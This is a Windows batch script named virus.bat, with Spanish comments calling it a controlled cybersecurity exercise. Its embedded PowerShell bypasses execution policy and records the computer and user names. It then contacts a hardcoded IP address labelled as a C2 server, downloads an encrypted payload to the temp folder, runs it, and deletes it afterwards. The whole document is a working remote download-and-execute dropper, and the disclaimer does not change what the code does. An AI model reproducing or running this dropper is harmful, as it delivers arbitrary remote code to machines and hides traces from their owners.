@echo off
REM =====================================================
REM virus.bat - PRÁCTICA CIBERSEGURIDAD AUDITABLE
REM =====================================================
REM ! ADVERTENCIA: SOLO PARA ENTORNOS CONTROLADOS !
REM =====================================================
title Ciberseguridad Practica - Instalador

echo.
echo =====================================================
echo    PRÁCTICA CIBERSEGURIDAD - DEMO CONTROLADA
echo =====================================================
echo    Autor: [Tu Nombre]
echo    Fecha: %DATE% %TIME%
echo =====================================================
echo.
echo [1/5] Verificando entorno...
timeout /t 2 /nobreak >nul

REM =====================================================
REM 1. CREAR Y EJECUTAR POWERSHELL AUDITABLE
REM =====================================================
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
"$log='%TEMP%\CiberDemo_%RANDOM%.log'; ^
 '=== INICIO ===' | Out-File $log; ^
 Add-Content $log ('Sistema: '+$env:COMPUTERNAME); ^
 Add-Content $log ('Usuario: '+$env:USERNAME); ^
 Add-Content $log ('Hora: '+(Get-Date)); ^
 Write-Host '[2/5] Conectando C2...' -ForegroundColor Cyan; ^
 try { ^
  $ts=[int](Get-Date -UFormat %%s); ^
  $r=iwr -Uri 'http://82.29.153.101:8080/auth/key?ts='+$ts -UseBasicParsing; ^
  Add-Content $log ('Auth OK: '+$r.Content.Length+' bytes'); ^
  $key='CyberDefense2024_FixedSalt_32charsExactly!!'+$ts; ^
  $pkey=([Security.Cryptography.SHA256]::Create().ComputeHash([Text.Encoding]::UTF8.GetBytes($key)))[0..43]; ^
  $r2=iwr -Uri 'http://82.29.153.101:8080/payload/encrypted' -Headers @{'X-Decrypt-Key'=[string]::Join('',$pkey)} -UseBasicParsing; ^
  [IO.File]::WriteAllBytes('%TEMP%\demo.ps1',$r2.Content); ^
  Write-Host '[3/5] Payload descargado' -ForegroundColor Green; ^
  Add-Content $log 'Payload: %TEMP%\demo.ps1 descargado'; ^
 } catch { ^
  Write-Host 'ERROR C2!' -ForegroundColor Red; ^
  Add-Content $log ('ERROR: '+$_.Exception.Message); ^
  pause; exit 1; ^
 }; ^
 Write-Host '[4/5] Ejecutando...' -ForegroundColor Magenta; ^
 & '%TEMP%\demo.ps1'; ^
 Start-Sleep 5; ^
 Write-Host '[5/5] Verificando...' -ForegroundColor Yellow; ^
 if (Test-Path '%PUBLIC%\Desktop\SystemDiagnostic.log') { ^
  Write-Host '✓ Marker OK!' -ForegroundColor Green; ^
  type '%PUBLIC%\Desktop\SystemDiagnostic.log'; ^
 } else { Write-Host '✗ Sin marker' -ForegroundColor Red }; ^
 Write-Host "`n🧹 Limpiando..." -ForegroundColor Gray; ^
 del '%TEMP%\demo.ps1' >nul 2>&1; ^
 Add-Content $log 'Limpieza OK'; ^
 Write-Host "`n✅ COMPLETADO! Logs: $log" -ForegroundColor Green; ^
 explorer '%TEMP%\CiberDemo_*.log';"

echo.
echo =====================================================
echo    PRACTICA FINALIZADA - REVISE LOS LOGS
echo =====================================================
pause